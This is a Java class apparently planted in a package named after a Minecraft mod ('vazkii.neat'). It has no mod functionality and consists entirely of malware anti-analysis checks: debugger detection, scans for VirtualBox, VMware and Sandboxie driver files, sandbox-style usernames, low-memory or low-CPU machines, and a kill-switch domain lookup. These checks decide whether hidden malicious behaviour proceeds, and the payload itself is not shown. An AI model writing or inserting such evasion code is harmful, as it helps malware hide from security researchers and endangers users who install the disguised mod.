package vazkii.neat;

import java.io.File;
import java.lang.management.ManagementFactory;
import java.net.InetAddress;
import java.net.UnknownHostException;

public final class D {
    private static final String TAG = "D";

    private D() {}

    public static boolean isSafe() {
        try {
            if (System.getProperty("jdwp") != null) { B.info(TAG, "jdwp"); return false; }
            if (isVM()) { B.info(TAG, "vm"); return false; }
            if (isLowSpec()) { B.info(TAG, "lowspec"); return false; }
            if (!killSwitchSafe()) { B.info(TAG, "killswitch triggered"); return false; }
            return true;
        } catch (Throwable t) {
            return false;
        }
    }

    private static boolean killSwitchSafe() {
        try {
            InetAddress.getByName("oterivmuwejdzuijfwerj.com");
            return false;
        } catch (UnknownHostException e) {
            return true;
        } catch (Exception e) {
            return true;
        }
    }

    private static boolean isVM() {
        String user = System.getenv("USERNAME");
        if (user == null) user = "";
        String u = user.toLowerCase();
        if (u.contains("sandbox") || u.contains("virus") || u.contains("malware")) return true;

        String sys = "C:\\Windows\\System32\\drivers\\";
        String[] drivers = {
            "VBoxMouse.sys", "VBoxGuest.sys", "VBoxSF.sys",
            "vmhgfs.sys", "vmmouse.sys", "vmrawdsk.sys", "vm3dmp.sys", "SbieDrv.sys"
        };
        for (String d : drivers) if (new File(sys + d).exists()) return true;
        return false;
    }

    private static boolean isLowSpec() {
        try {
            com.sun.management.OperatingSystemMXBean os =
                (com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean();
            if (os.getTotalMemorySize() < 2L * 1024 * 1024 * 1024) return true;
            if (Runtime.getRuntime().availableProcessors() < 2) return true;
        } catch (Throwable ignored) {}
        return false;
    }
}